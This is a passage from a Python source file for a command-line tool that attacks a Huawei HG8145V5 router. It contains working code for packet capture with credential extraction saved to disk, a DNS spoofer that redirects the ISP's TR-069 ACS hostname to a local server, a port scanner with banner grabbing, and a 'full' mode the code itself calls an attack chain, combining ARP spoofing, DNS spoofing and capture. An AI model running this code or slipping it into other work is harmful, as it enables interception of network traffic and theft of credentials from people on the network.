            pkt = self._parse_ip_packet(raw, ts)
        else:
            # Linux AF_PACKET yields full Ethernet frames
            pkt = self._parse_ethernet_frame(raw, ts)

        if pkt is None:
            return

        # Collect device MACs
        if pkt.src_mac and pkt.src_mac != NULL_MAC:
            self.device_macs.add(pkt.src_mac)

        # Filter: only interesting traffic
        if not self._is_interesting(pkt):
            return

        with self._lock:
            self.packets.append(pkt)

        # Credential extraction on HTTP / login traffic
        if pkt.dst_port in (80, 443, 7547) or pkt.src_port in (80, 443, 7547):
            self.credential_extractor.extract(pkt)

        # CWMP analysis on TR-069 traffic
        if pkt.dst_port == 7547 or pkt.src_port == 7547:
            self.cwmp_analyzer.analyse(pkt)

        # DNS analysis
        if pkt.dst_port == DNS_PORT or pkt.src_port == DNS_PORT:
            self._analyse_dns(pkt)

        log.debug(
            "PKT %s %s:%d → %s:%d proto=%s len=%d",
            ts,
            pkt.src_ip,
            pkt.src_port,
            pkt.dst_ip,
            pkt.dst_port,
            pkt.protocol,
            len(pkt.payload),
        )

    def _parse_ethernet_frame(self, raw: bytes, ts: str) -> Optional[CapturedPacket]:
        if len(raw) < 14:
            return None
        dst_mac = _mac_str(raw[0:6])
        src_mac = _mac_str(raw[6:12])
        eth_type = struct.unpack("!H", raw[12:14])[0]

        if eth_type != ETH_P_IP:
            return None

        return self._parse_ip_payload(raw[14:], ts, src_mac, dst_mac)

    def _parse_ip_packet(self, raw: bytes, ts: str) -> Optional[CapturedPacket]:
        return self._parse_ip_payload(raw, ts, "", "")

    def _parse_ip_payload(
        self, data: bytes, ts: str, src_mac: str, dst_mac: str
    ) -> Optional[CapturedPacket]:
        if len(data) < 20:
            return None

        version_ihl = data[0]
        ihl = (version_ihl & 0x0F) * 4
        if ihl < 20 or len(data) < ihl:
            return None

        total_length = struct.unpack("!H", data[2:4])[0]
        ip_proto = data[9]
        src_ip = _ip_str(data[12:16])
        dst_ip = _ip_str(data[16:20])

        pkt = CapturedPacket(
            timestamp=ts,
            src_mac=src_mac,
            dst_mac=dst_mac,
            src_ip=src_ip,
            dst_ip=dst_ip,
        )

        transport_data = data[ihl:]

        if ip_proto == IPPROTO_TCP and len(transport_data) >= 20:
            pkt.protocol = "TCP"
            pkt.src_port, pkt.dst_port = struct.unpack("!HH", transport_data[0:4])
            tcp_offset = ((transport_data[12] >> 4) & 0x0F) * 4
            pkt.payload = transport_data[tcp_offset:]
        elif ip_proto == IPPROTO_UDP and len(transport_data) >= 8:
            pkt.protocol = "UDP"
            pkt.src_port, pkt.dst_port = struct.unpack("!HH", transport_data[0:4])
            pkt.payload = transport_data[8:]
        else:
            pkt.protocol = f"IP/{ip_proto}"
            pkt.payload = transport_data

        return pkt

    def _is_interesting(self, pkt: CapturedPacket) -> bool:
        """Return *True* if the packet involves the router or interesting ports."""
        ips = {pkt.src_ip, pkt.dst_ip}
        if self.router_ip in ips:
            return True
        ports = {pkt.src_port, pkt.dst_port}
        if ports & INTERESTING_PORTS:
            return True
        return False

    # -- DNS -----------------------------------------------------------------

    def _analyse_dns(self, pkt: CapturedPacket) -> None:
        """Extract DNS query/response names from a UDP DNS payload."""
        data = pkt.payload
        if len(data) < 12:
            return
        # DNS header
        _txn_id, flags, qd_count, an_count = struct.unpack("!HHHH", data[0:8])
        is_response = bool(flags & 0x8000)

        offset = 12
        queries: List[str] = []
        for _ in range(qd_count):
            name, offset = self._dns_read_name(data, offset)
            if name:
                queries.append(name)
            offset += 4  # skip QTYPE + QCLASS

        answers: List[Dict[str, str]] = []
        if is_response:
            for _ in range(an_count):
                if offset >= len(data):
                    break
                name, offset = self._dns_read_name(data, offset)
                if offset + 10 > len(data):
                    break
                rtype, _rclass, _ttl, rdlength = struct.unpack(
                    "!HHiH", data[offset : offset + 10]
                )
                offset += 10
                if rtype == 1 and rdlength == 4 and offset + 4 <= len(data):
                    addr = _ip_str(data[offset : offset + 4])
                    answers.append({"name": name, "type": "A", "address": addr})
                offset += rdlength

        entry: Dict[str, Any] = {
            "timestamp": pkt.timestamp,
            "src_ip": pkt.src_ip,
            "dst_ip": pkt.dst_ip,
            "is_response": is_response,
            "queries": queries,
            "answers": answers,
        }
        with self._lock:
            self.dns_queries.append(entry)

        if queries:
            log.info(
                "DNS %s: %s %s",
                "response" if is_response else "query",
                ", ".join(queries),
                answers if answers else "",
            )

    @staticmethod
    def _dns_read_name(data: bytes, offset: int) -> Tuple[str, int]:
        """Read a DNS domain name with pointer support."""
        labels: List[str] = []
        visited: Set[int] = set()
        jumped = False
        return_offset = offset

        while offset < len(data):
            if offset in visited:
                break
            visited.add(offset)

            length = data[offset]
            if length == 0:
                if not jumped:
                    return_offset = offset + 1
                break
            if (length & 0xC0) == 0xC0:
                if offset + 1 >= len(data):
                    break
                pointer = struct.unpack("!H", data[offset : offset + 2])[0] & 0x3FFF
                if not jumped:
                    return_offset = offset + 2
                offset = pointer
                jumped = True
                continue

            offset += 1
            if offset + length > len(data):
                break
            labels.append(data[offset : offset + length].decode("ascii", errors="replace"))
            offset += length
            if not jumped:
                return_offset = offset

        return ".".join(labels), return_offset

    # -- stop / save ---------------------------------------------------------

    def stop(self) -> None:
        """Stop capture and save results."""
        self._stop_event.set()
        if self._capture_thread is not None:
            self._capture_thread.join(timeout=5.0)
        if self._sock is not None:
            if sys.platform == "win32":
                try:
                    self._sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)  # type: ignore[attr-defined]
                except Exception:
                    pass
            self._sock.close()
            self._sock = None
        self.save()
        log.info("Packet capture stopped. %d packets captured.", len(self.packets))

    def save(self) -> None:
        """Persist captured data to JSON files."""
        _ensure_output_dir(self.output_dir)
        ts = _timestamp()

        if self.packets:
            _save_json(
                [p.as_dict() for p in self.packets],
                self.output_dir / f"packets_{ts}.json",
            )

        if self.credential_extractor.credentials:
            _save_json(
                [c.as_dict() for c in self.credential_extractor.credentials],
                self.output_dir / f"credentials_{ts}.json",
            )

        if self.dns_queries:
            _save_json(self.dns_queries, self.output_dir / f"dns_{ts}.json")

        if self.device_macs:
            _save_json(
                {"macs": sorted(self.device_macs)},
                self.output_dir / f"device_macs_{ts}.json",
            )

        cwmp = self.cwmp_analyzer.summary()
        if cwmp.get("parameter_count", 0) > 0 or cwmp.get("config_changes"):
            _save_json(cwmp, self.output_dir / f"cwmp_{ts}.json")

        log.info("Capture data saved to %s/", self.output_dir)


# ---------------------------------------------------------------------------
# DNS Spoofing
# ---------------------------------------------------------------------------


class DNSSpoofer:
    """
    DNS spoofing to redirect the router's ACS URL to our local TR-069 server.

    When the router resolves the ISP ACS hostname, respond with our IP address
    so TR-069 traffic comes to our local ACS server (tr069_server.py).

    Listens on UDP port 53 for queries matching *target_domain* and responds
    with *redirect_ip*.  All other queries are forwarded to *upstream_dns*.
    """

    def __init__(
        self,
        target_domain: str,
        redirect_ip: str,
        listen_ip: str = "0.0.0.0",
        listen_port: int = DNS_PORT,
        upstream_dns: str = "8.8.8.8",
    ) -> None:
        self.target_domain = target_domain.lower().rstrip(".")
        self.redirect_ip = redirect_ip
        self.listen_ip = listen_ip
        self.listen_port = listen_port
        self.upstream_dns = upstream_dns

        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._sock: Optional[socket.socket] = None

    def start(self) -> None:
        """Start the DNS spoofing server."""
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self._sock.bind((self.listen_ip, self.listen_port))
        except OSError as exc:
            log.error(
                "Cannot bind DNS on %s:%d (need Administrator/root or port in use): %s",
                self.listen_ip,
                self.listen_port,
                exc,
            )
            self._sock.close()
            self._sock = None
            return

        self._stop_event.clear()
        self._thread = threading.Thread(
            target=self._serve_loop, daemon=True, name="dns-spoof"
        )
        self._thread.start()
        log.info(
            "DNS spoofer listening on %s:%d — %s → %s",
            self.listen_ip,
            self.listen_port,
            self.target_domain,
            self.redirect_ip,
        )

    def _serve_loop(self) -> None:
        assert self._sock is not None
        self._sock.settimeout(1.0)

        while not self._stop_event.is_set():
            try:
                data, addr = self._sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                if self._stop_event.is_set():
                    break
                continue

            try:
                response = self._handle_query(data)
            except Exception as exc:
                log.debug("DNS handle error from %s: %s", addr, exc)
                continue

            if response is not None:
                try:
                    self._sock.sendto(response, addr)
                except OSError as exc:
                    log.debug("DNS send error to %s: %s", addr, exc)

    def _handle_query(self, data: bytes) -> Optional[bytes]:
        """Parse a DNS query; spoof if it matches target_domain, else forward."""
        if len(data) < 12:
            return None

        txn_id = data[0:2]
        flags = struct.unpack("!H", data[2:4])[0]
        qd_count = struct.unpack("!H", data[4:6])[0]

        if flags & 0x8000:
            return None  # already a response

        # Parse first question
        offset = 12
        qname, offset = self._read_qname(data, offset)
        if offset + 4 > len(data):
            return None
        qtype, qclass = struct.unpack("!HH", data[offset : offset + 4])

        qname_lower = qname.lower().rstrip(".")

        if qname_lower == self.target_domain and qtype == 1:
            log.warning("DNS SPOOF: %s → %s (was queried by client)", qname, self.redirect_ip)
            return self._build_spoof_response(txn_id, data[12 : offset + 4], qname, qtype, qclass)

        # Forward to upstream
        return self._forward_query(data)

    def _build_spoof_response(
        self,
        txn_id: bytes,
        question_section: bytes,
        qname: str,
        qtype: int,
        qclass: int,
    ) -> bytes:
        """Construct a DNS response with the redirect IP."""
        flags = 0x8180  # response, recursion available
        header = txn_id + struct.pack(
            "!HHHHH",
            flags,
            1,  # QD count
            1,  # AN count
            0,  # NS count
            0,  # AR count
        )

        # Answer: pointer to question name + A record
        answer = (
            b"\xc0\x0c"  # name pointer to offset 12
            + struct.pack("!HHiH", 1, 1, 60, 4)  # type A, class IN, TTL 60, rdlength 4
            + _ip_bytes(self.redirect_ip)
        )

        return header + question_section + answer

    def _forward_query(self, data: bytes) -> Optional[bytes]:
        """Forward query to upstream DNS and return the response."""
        try:
            fwd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            fwd.settimeout(3.0)
            fwd.sendto(data, (self.upstream_dns, 53))
            resp, _ = fwd.recvfrom(4096)
            fwd.close()
            return resp
        except Exception as exc:
            log.debug("DNS forward to %s failed: %s", self.upstream_dns, exc)
            return None

    @staticmethod
    def _read_qname(data: bytes, offset: int) -> Tuple[str, int]:
        """Read a DNS name from the wire (no pointer chasing needed for queries)."""
        labels: List[str] = []
        while offset < len(data):
            length = data[offset]
            if length == 0:
                offset += 1
                break
            if (length & 0xC0) == 0xC0:
                if offset + 1 >= len(data):
                    break
                pointer = struct.unpack("!H", data[offset : offset + 2])[0] & 0x3FFF
                label_part, _ = DNSSpoofer._read_qname(data, pointer)
                labels.append(label_part)
                offset += 2
                return ".".join(labels), offset
            offset += 1
            if offset + length > len(data):
                break
            labels.append(data[offset : offset + length].decode("ascii", errors="replace"))
            offset += length
        return ".".join(labels), offset

    def stop(self) -> None:
        self._stop_event.set()
        if self._thread is not None:
            self._thread.join(timeout=5.0)
        if self._sock is not None:
            self._sock.close()
            self._sock = None
        log.info("DNS spoofer stopped.")


# ---------------------------------------------------------------------------
# Network Scanner
# ---------------------------------------------------------------------------


class NetworkScanner:
    """
    Scan the router for open ports and services.

    Ports to scan:
    - 80  (HTTP admin)
    - 443 (HTTPS admin)
    - 23  (Telnet)
    - 22  (SSH)
    - 7547 (TR-069 CWMP)
    - 8080, 8443 (alternate admin)
    - 30005 (OMCI)
    - 37215 (Huawei API)
    """

    def __init__(
        self,
        target_ip: str,
        ports: Optional[Dict[int, str]] = None,
        timeout: float = 2.0,
        max_threads: int = 20,
    ) -> None:
        self.target_ip = target_ip
        self.ports = ports or dict(ROUTER_PORTS)
        self.timeout = timeout
        self.max_threads = max_threads
        self.results: List[ScanResult] = []
        self._lock = threading.Lock()

    def scan(self) -> List[ScanResult]:
        """Scan all configured ports and return results."""
        log.info("Scanning %s — %d ports …", self.target_ip, len(self.ports))
        threads: List[threading.Thread] = []
        semaphore = threading.Semaphore(self.max_threads)

        for port, service in sorted(self.ports.items()):
            t = threading.Thread(
                target=self._probe_port,
                args=(port, service, semaphore),
                daemon=True,
            )
            threads.append(t)
            t.start()

        for t in threads:
            t.join(timeout=self.timeout + 5)

        self.results.sort(key=lambda r: r.port)
        return list(self.results)

    def _probe_port(self, port: int, service: str, sem: threading.Semaphore) -> None:
        sem.acquire()
        try:
            result = self._tcp_connect(port, service)
            with self._lock:
                self.results.append(result)
        finally:
            sem.release()

    def _tcp_connect(self, port: int, service: str) -> ScanResult:
        """Attempt a TCP connect to *port* and grab a banner if possible."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        banner = ""
        try:
            sock.connect((self.target_ip, port))
            state = "open"
            log.info("  %s:%d (%s) — OPEN", self.target_ip, port, service)

            # Try grabbing a banner
            try:
                sock.settimeout(1.5)
                # Send a minimal probe for HTTP
                if port in (80, 443, 8080, 8443, 7547, 37215):
                    sock.sendall(
                        b"GET / HTTP/1.0\r\nHost: "
                        + self.target_ip.encode()
                        + b"\r\n\r\n"
                    )
                raw = sock.recv(1024)
                banner = raw.decode("utf-8", errors="replace").strip()[:200]
            except Exception:
                pass
        except socket.timeout:
            state = "filtered"
            log.debug("  %s:%d (%s) — filtered", self.target_ip, port, service)
        except ConnectionRefusedError:
            state = "closed"
            log.debug("  %s:%d (%s) — closed", self.target_ip, port, service)
        except OSError as exc:
            state = "filtered"
            log.debug("  %s:%d (%s) — %s", self.target_ip, port, service, exc)
        finally:
            sock.close()

        return ScanResult(port=port, service=service, state=state, banner=banner)

    def print_results(self) -> None:
        """Pretty-print scan results to stdout."""
        print(f"\n{'='*60}")
        print(f"  Scan results for {self.target_ip}")
        print(f"{'='*60}")
        print(f"  {'PORT':<8} {'SERVICE':<12} {'STATE':<10} BANNER")
        print(f"  {'-'*56}")
        for r in self.results:
            short_banner = (r.banner[:40] + "…") if len(r.banner) > 40 else r.banner
            short_banner = short_banner.replace("\r", "").replace("\n", " ")
            print(f"  {r.port:<8} {r.service:<12} {r.state:<10} {short_banner}")
        print(f"{'='*60}\n")


# ---------------------------------------------------------------------------
# Orchestrator
# ---------------------------------------------------------------------------


class TrafficAnalyzer:
    """Main orchestrator that combines all components."""

    def __init__(
        self,
        mode: str,
        router_ip: str,
        our_ip: str = "",
        gateway_ip: str = "",
        interface: str = "eth0",
        acs_domain: str = "",
        redirect_ip: str = "",
        output_dir: str = "captures",
        duration: int = 0,
    ) -> None:
        self.mode = mode
        self.router_ip = router_ip
        self.our_ip = our_ip or self._detect_our_ip()
        self.gateway_ip = gateway_ip or router_ip
        self.interface = interface
        self.acs_domain = acs_domain
        self.redirect_ip = redirect_ip or self.our_ip
        self.output_dir = Path(output_dir)
        self.duration = duration

        self.our_mac = self._detect_our_mac()

        self.scanner: Optional[NetworkScanner] = None
        self.capture: Optional[PacketCapture] = None
        self.arp_spoofer: Optional[ARPSpoofer] = None
        self.dns_spoofer: Optional[DNSSpoofer] = None

    # -- auto-detection ------------------------------------------------------

    @staticmethod
    def _detect_our_ip() -> str:
        """Best-effort detection of our local IP by connecting to a dummy target."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((_IP_DETECTION_TARGET, 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    @staticmethod
    def _detect_our_mac() -> str:
        """Get our MAC from uuid.getnode() (works cross-platform)."""
        mac_int = uuid.getnode()
        mac_bytes_val = mac_int.to_bytes(6, byteorder="big")
        return _mac_str(mac_bytes_val)

    # -- run modes -----------------------------------------------------------

    def run(self) -> None:
        """Execute the selected mode."""
        log.info("Mode: %s | Router: %s | Our IP: %s | Our MAC: %s",
                 self.mode, self.router_ip, self.our_ip, self.our_mac)

        if self.mode == "scan":
            self._run_scan()
        elif self.mode == "capture":
            self._run_capture()
        elif self.mode == "arp-spoof":
            self._run_arp_spoof()
        elif self.mode == "dns-spoof":
            self._run_dns_spoof()
        elif self.mode == "full":
            self._run_full()
        else:
            log.error("Unknown mode: %s", self.mode)
            sys.exit(1)

    def _run_scan(self) -> None:
        self.scanner = NetworkScanner(self.router_ip)
        results = self.scanner.scan()
        self.scanner.print_results()
        _ensure_output_dir(self.output_dir)
        _save_json(
            [r.as_dict() for r in results],
            self.output_dir / f"scan_{_timestamp()}.json",
        )

    def _run_capture(self) -> None:
        self.capture = PacketCapture(
            our_ip=self.our_ip,
            router_ip=self.router_ip,
            interface=self.interface,
            output_dir=self.output_dir,
        )
        self.capture.start()
        self._wait_for_duration()
        self.capture.stop()

    def _run_arp_spoof(self) -> None:
        if not _is_admin():
            log.error("ARP spoofing requires Administrator/root. Aborting.")
            sys.exit(1)

        self.arp_spoofer = ARPSpoofer(
            our_ip=self.our_ip,
            our_mac=self.our_mac,
            router_ip=self.router_ip,
            interface=self.interface,
        )
        self.capture = PacketCapture(
            our_ip=self.our_ip,
            router_ip=self.router_ip,
            interface=self.interface,
            output_dir=self.output_dir,
        )

        self.arp_spoofer.start()
        self.capture.start()
        try:
            self._wait_for_duration()
        finally:
            self.capture.stop()
            self.arp_spoofer.stop()

    def _run_dns_spoof(self) -> None:
        if not self.acs_domain:
            log.error("--acs-domain is required for dns-spoof mode.")
            sys.exit(1)

        self.dns_spoofer = DNSSpoofer(
            target_domain=self.acs_domain,
            redirect_ip=self.redirect_ip,
        )
        self.dns_spoofer.start()
        self._wait_for_duration()
        self.dns_spoofer.stop()

    def _run_full(self) -> None:
        """Full attack chain: ARP spoof + DNS spoof + capture + analysis."""
        if not _is_admin():
            log.error("Full mode requires Administrator/root. Aborting.")
            sys.exit(1)

        self.arp_spoofer = ARPSpoofer(
            our_ip=self.our_ip,
            our_mac=self.our_mac,
            router_ip=self.router_ip,
            interface=self.interface,
        )
        self.capture = PacketCapture(
            our_ip=self.our_ip,
            router_ip=self.router_ip,
            interface=self.interface,
            output_dir=self.output_dir,
        )

        if self.acs_domain:
            self.dns_spoofer = DNSSpoofer(
                target_domain=self.acs_domain,
                redirect_ip=self.redirect_ip,
            )

        self.arp_spoofer.start()
        self.capture.start()
        if self.dns_spoofer:
            self.dns_spoofer.start()

        try:
            self._wait_for_duration()
        finally:
            if self.dns_spoofer:
                self.dns_spoofer.stop()
            self.capture.stop()
            self.arp_spoofer.stop()

        self._print_summary()

    # -- helpers -------------------------------------------------------------

    def _wait_for_duration(self) -> None:
        """Block until duration expires or Ctrl-C is pressed."""
        if self.duration > 0:
            log.info("Running for %d seconds (Ctrl-C to stop early) …", self.duration)
            try:
                deadline = time.monotonic() + self.duration
                while time.monotonic() < deadline:
                    time.sleep(0.5)
            except KeyboardInterrupt:
                log.info("Interrupted — shutting down …")
        else:
            log.info("Running until Ctrl-C …")
            try:
                while True:
                    time.sleep(0.5)
            except KeyboardInterrupt:
                log.info("Interrupted — shutting down …")

    def _print_summary(self) -> None:
        print(f"\n{'='*60}")
        print("  Traffic Capture Summary")
        print(f"{'='*60}")
        if self.capture:
            print(f"  Packets captured   : {len(self.capture.packets)}")
            print(f"  Credentials found  : {len(self.capture.credential_extractor.credentials)}")
            print(f"  DNS queries logged : {len(self.capture.dns_queries)}")
            print(f"  Device MACs seen   : {len(self.capture.device_macs)}")
            cwmp = self.capture.cwmp_analyzer.summary()
            if cwmp["acs_url"]:
                print(f"  ACS URL            : {cwmp['acs_url']}")
            if cwmp["serial"]:
                print(f"  Device serial      : {cwmp['serial']}")
            if cwmp["firmware"]:
                print(f"  Firmware           : {cwmp['firmware']}")
            print(f"  CWMP parameters    : {cwmp['parameter_count']}")
            print(f"  Config changes     : {len(cwmp['config_changes'])}")
            print(f"  Firmware URLs      : {len(cwmp['firmware_urls'])}")
        print(f"  Output directory   : {self.output_dir}/")
        print(f"{'='*60}\n")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def main() -> None:
    parser = argparse.ArgumentParser(
        prog="traffic_capture",
        description="Network traffic capture & ARP spoofing tool for Huawei HG8145V5 analysis.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            modes:
              scan        Port scan the router, detect services
              capture     Passive packet capture and analysis (no spoofing)
              arp-spoof   ARP spoofing + traffic capture
              dns-spoof   DNS spoofing to redirect ACS traffic
              full        ARP spoof + DNS spoof + capture + analysis

            examples:
              %(prog)s --mode scan --router-ip 192.168.100.1
              %(prog)s --mode capture --router-ip 192.168.100.1 --our-ip 192.168.100.50
              %(prog)s --mode arp-spoof --router-ip 192.168.100.1 --our-ip 192.168.100.50
              %(prog)s --mode dns-spoof --acs-domain acs.isp.com --redirect-ip 192.168.100.50
              %(prog)s --mode full --router-ip 192.168.100.1 --our-ip 192.168.100.50 \\
                        --acs-domain acs.isp.com --redirect-ip 192.168.100.50
        """),
    )

    parser.add_argument(
        "--mode",
        required=True,
        choices=["scan", "capture", "arp-spoof", "dns-spoof", "full"],
        help="Operation mode.",
    )
    parser.add_argument(
        "--router-ip",
        default="192.168.100.1",
        help="IP address of the Huawei HG8145V5 router (default: 192.168.100.1).",
    )
    parser.add_argument(
        "--gateway-ip",
        default="",
        help="Gateway IP (defaults to --router-ip).",
    )
    parser.add_argument(
        "--interface",
        default="eth0",
        help="Network interface to use (default: eth0).",
    )
    parser.add_argument(
        "--our-ip",
        default="",
        help="Our IP address (auto-detected if omitted).",
    )
    parser.add_argument(
        "--acs-domain",
        default="",
        help="ISP ACS hostname to spoof (required for dns-spoof / full).",
    )
    parser.add_argument(
        "--redirect-ip",
        default="",
        help="IP to redirect spoofed DNS to (defaults to --our-ip).",
    )
    parser.add_argument(
        "--output",
        default="captures",
        help="Output directory for captured data (default: captures/).",
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=0,
        help="Capture duration in seconds (0 = run until Ctrl-C).",
    )
    parser.add_argument(
        "--log-level",
        default="DEBUG",
        choices=["DEBUG", "INFO", "WARNING", "ERROR"],
        help="Logging verbosity (default: DEBUG).",
    )

    args = parser.parse_args()

    logging.getLogger().setLevel(getattr(logging, args.log_level))

    analyzer = TrafficAnalyzer(
        mode=args.mode,
        router_ip=args.router_ip,
        our_ip=args.our_ip,
        gateway_ip=args.gateway_ip,
        interface=args.interface,
        acs_domain=args.acs_domain,
        redirect_ip=args.redirect_ip,
        output_dir=args.output,
        duration=args.duration,
    )

    try:
        analyzer.run()
    except KeyboardInterrupt:
        log.info("Caught Ctrl-C — cleaning up …")
    except Exception as exc:
        log.error("Fatal error: %s", exc, exc_info=True)
        sys.exit(1)
    finally:
        # Ensure cleanup regardless of how we exit
        if analyzer.arp_spoofer is not None:
            try:
                analyzer.arp_spoofer.stop()
            except Exception:
                pass
        if analyzer.capture is not None:
            try:
                analyzer.capture.stop()
            except Exception:
                pass
        if analyzer.dns_spoofer is not None:
            try:
                analyzer.dns_spoofer.stop()
            except Exception:
                pass


if __name__ == "__main__":
    main()
